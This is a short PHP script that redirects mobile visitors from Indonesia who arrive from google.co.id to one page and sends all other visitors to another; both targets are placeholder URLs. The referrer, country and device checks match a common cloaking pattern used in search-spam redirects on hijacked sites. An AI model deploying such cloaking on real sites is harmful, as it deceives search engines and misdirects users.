<?php
function isMobile() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return preg_match('/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini/', $userAgent);
}

function isFromIndonesia($ip) {
    $response = @file_get_contents("http://ip-api.com/json/{$ip}");
    if ($response === false) {
        return false; // Handle API error
    }
    $data = json_decode($response, true);
    return isset($data['country']) && $data['country'] === 'Indonesia';
}

$userIp = $_SERVER['REMOTE_ADDR'];

if (isMobile() && isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false && isFromIndonesia($userIp)) {
    header("Location: https://amp-page.html");
    exit();
} else {
    header("Location: https://redirect.com");
    exit();
}
?>
